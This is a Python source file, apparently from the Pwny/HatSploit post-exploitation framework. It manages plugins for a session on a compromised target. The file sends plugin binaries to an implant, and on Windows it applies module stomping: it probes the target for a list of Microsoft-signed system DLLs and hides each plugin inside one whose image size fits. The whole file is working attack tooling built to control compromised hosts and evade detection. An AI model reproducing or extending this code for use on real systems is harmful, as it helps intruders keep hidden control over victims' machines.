"""
MIT License

Copyright (c) 2020-2026 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os

from pwny.api import *
from pwny.types import *

from typing import Union
from badges import Badges
from badges.tables import Tables

from hatsploit.core.db.importer import Importer
from hatsploit.lib.core.session import Session


class Plugins(Badges, Tables):
    """ Subclass of pwny module.

    This subclass of pwny module is intended for providing
    Pwny plugins handler implementation.
    """

    # Stomp candidates — Microsoft-signed system DLLs present on Win10+
    # that are rarely loaded by default in a minimal console process.
    # Each COT plugin load picks the next unused candidate; on unload
    # the candidate is recycled back into the pool.
    STOMP_CANDIDATES = [
        "cabinet.dll",
        "mpr.dll",
        "odbc32.dll",
        "dpx.dll",
        "gpapi.dll",
        "httpapi.dll",
        "mprapi.dll",
        "pdh.dll",
        "srclient.dll",
        "tdh.dll",
        "wtsapi32.dll",
        "xmllite.dll",
        "cldapi.dll",
        "edputil.dll",
        "webio.dll",
        "davclnt.dll",
        "dhcpcsvc.dll",
        "tbs.dll",
        "netutils.dll",
        "slc.dll",
        "sppc.dll",
    ]

    def __init__(self) -> None:
        self.imported_plugins = {}
        self.loaded_plugins = {}
        self.plugin_ids = {}

        # Stomp candidate tracking (per-session):
        # available = [(name, image_size), ...] sorted largest-first
        # used      = {plugin_name: (name, image_size)} for recycling on unload
        # probed    = True once we've queried the client
        self.stomp_available = []
        self.stomp_used = {}
        self.stomp_probed = False

    def probe_stomp_candidates(self, session: Session) -> None:
        """ Send the full candidate list to the client and get back
        which DLLs actually exist, along with their image sizes.

        Called lazily on the first Windows COT plugin load.

        :param Session session: active session
        :return None: None
        """

        if self.stomp_probed:
            return
        self.stomp_probed = True

        candidates_str = '\n'.join(self.STOMP_CANDIDATES)

        try:
            tlv = session.send_command(
                tag=BUILTIN_PROBE_STOMP,
                args={
                    TLV_TYPE_STRING: candidates_str,
                },
            )
        except Exception:
            self.print_warning("Failed to probe stomp candidates.")
            return

        if tlv.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_warning("Stomp probe returned failure.")
            return

        available = []
        entry = tlv.get_tlv(TLV_TYPE_GROUP)

        while entry:
            name = entry.get_string(TLV_TYPE_STRING)
            size = entry.get_int(TLV_TYPE_INT)

            if name and size:
                available.append((name, size))

            entry = tlv.get_tlv(TLV_TYPE_GROUP)

        if not available:
            self.print_warning("No stomp candidates available on target.")
            return

        # Sort smallest-first so we pick the tightest fit for each plugin
        available.sort(key=lambda x: x[1])

        self.stomp_available = available
        self.print_information(
            f"Probed {len(available)} stomp candidates on target."
        )

    def import_plugins(self, path: str, session: Session) -> None:
        """ Import plugins for the specified session.

        :param str path: path to import plugins from
        :param Session session: session to import plugins for
        :return None: None
        """

        for file in os.listdir(path):
            if not file.endswith('.py') or file == '__init__.py':
                continue

            plugin = Importer.import_plugin(path + '/' + file)
            plugin.session = session
            plugin_name = plugin.info['Plugin']

            self.imported_plugins[plugin_name] = plugin

    def show_plugins(self, filt: str = 'all') -> None:
        """ Show plugins.

        :param str filt: filter — 'all' (default), 'loaded', or 'avail'
        :return None: None
        """

        headers = ("Number", "Plugin", "Name", "Loaded")
        data = []
        number = 0

        for name in sorted(self.imported_plugins):
            is_loaded = name in self.loaded_plugins

            if filt == 'loaded' and not is_loaded:
                continue
            if filt == 'avail' and is_loaded:
                continue

            plugin = self.imported_plugins[name]
            data.append(
                (number, name, plugin.info['Name'],
                 'Yes' if is_loaded else 'No')
            )
            number += 1

        if not data:
            labels = {'all': '', 'loaded': ' loaded', 'avail': ' available'}
            raise RuntimeWarning(f"No{labels[filt]} plugins found.")

        titles = {'all': 'Plugins', 'loaded': 'Loaded Plugins',
                  'avail': 'Available Plugins'}
        self.print_table(titles[filt], headers, *data)

    def load_plugin(self, plugin: str) -> None:
        """ Load specified plugin.

        :param str plugin: plugin to load
        :return None: None
        :raises RuntimeError: with trailing error message
        """

        self.print_process(f"Loading plugin {plugin}...")

        if plugin in self.loaded_plugins:
            raise RuntimeWarning(f"Plugin is already loaded: {plugin}.")

        if plugin not in self.imported_plugins:
            raise RuntimeError(f"Invalid plugin: {plugin}!")

        plugin_object = self.imported_plugins[plugin]

        session = plugin_object.session
        info = plugin_object.info

        platform = str(session.info['Platform']).lower()
        arch = str(session.info['Arch'])
        tab_name = info['Plugin']

        tab_path = os.path.join(session.pwny_tabs, platform, arch, tab_name)

        if not os.path.exists(tab_path):
            for ext in ('.dll', '.so', '.dylib'):
                candidate = tab_path + ext
                if os.path.exists(candidate):
                    tab_path = candidate
                    break

        if os.path.exists(tab_path):
            with open(tab_path, 'rb') as f:
                data = f.read()

                args = {TLV_TYPE_TAB: data}

                # For Windows COT plugins, probe once then pick
                # the smallest candidate that fits this blob
                if platform == 'windows':
                    if not self.stomp_probed:
                        self.probe_stomp_candidates(session)

                    # Find the smallest candidate whose image fits
                    # code_size + 0x1000 (PE header page)
                    needed = len(data) + 0x1000
                    stomp_entry = None

                    for i, (name, size) in enumerate(self.stomp_available):
                        if size >= needed:
                            stomp_entry = self.stomp_available.pop(i)
                            break

                    if stomp_entry is not None:
                        self.stomp_used[plugin] = stomp_entry
                        args[TLV_TYPE_FILENAME] = stomp_entry[0]
                        self.print_process(
                            f"Sending plugin TAB ({len(data)} bytes)...")
                        self.print_process(f"Using {stomp_entry[0]} as stomp DLL...")
                    else:
                        self.print_warning(
                            "No suitable stomp candidate available!"
                        )
                        self.print_process(
                            f"Sending plugin TAB ({len(data)} bytes)..."
                        )
                else:
                    self.print_process(
                        f"Sending plugin TAB ({len(data)} bytes)..."
                    )

                tlv = session.send_command(
                    tag=BUILTIN_ADD_TAB_BUFFER,
                    args=args,
                )

                if tlv.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                    # Discard the candidate — it failed on this target
                    # (e.g. DLL not present, image too small). Do NOT
                    # reclaim it; the next load will try a different one.
                    self.stomp_used.pop(plugin, None)
                    raise RuntimeError(f"Failed to load plugin: {plugin}!")

                tab_id = tlv.get_int(TLV_TYPE_TAB_ID)
                plugin_object.plugin = tab_id
                self.plugin_ids[plugin] = tab_id

        else:
            self.print_warning("No TAB was sent to a client.")
            self.plugin_ids[plugin] = -len(self.loaded_plugins)

        self.loaded_plugins[plugin] = plugin_object
        plugin_object.load()

        self.print_success(f"Loaded plugin {plugin}!")

    def unload_plugin(self, plugin: str) -> None:
        """ Unload specified plugin.

        :param str plugin: plugin to unload
        :return None: None
        :raises RuntimeError: with trailing error message
        """

        self.print_process(f"Unloading plugin {plugin}...")

        if plugin not in self.imported_plugins:
            raise RuntimeError(f"Plugin is not loaded: {plugin}!")

        plugin_object = self.loaded_plugins[plugin]
        session = plugin_object.session

        if self.plugin_ids[plugin] >= 0:
            tlv = session.send_command(
                tag=TAB_TERM,
                plugin=self.plugin_ids[plugin],
            )

            if tlv.get_int(TLV_TYPE_STATUS) != TLV_STATUS_QUIT:
                raise RuntimeError(f"Failed to quit plugin: {plugin}!")

            tlv = session.send_command(
                tag=BUILTIN_DEL_TAB,
                args={
                    TLV_TYPE_INT: self.plugin_ids[plugin]
                }
            )

            if tlv.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                raise RuntimeError(f"Failed to unload plugin: {plugin}!")

        self.loaded_plugins.pop(plugin)
        self.plugin_ids.pop(plugin)

        # Reclaim stomp candidate for reuse (keep sorted by size)
        if plugin in self.stomp_used:
            entry = self.stomp_used.pop(plugin)
            # Insert back in size-sorted order
            inserted = False
            for i, (_, sz) in enumerate(self.stomp_available):
                if entry[1] <= sz:
                    self.stomp_available.insert(i, entry)
                    inserted = True
                    break
            if not inserted:
                self.stomp_available.append(entry)

        self.print_success(f"Unloaded plugin {plugin}!")
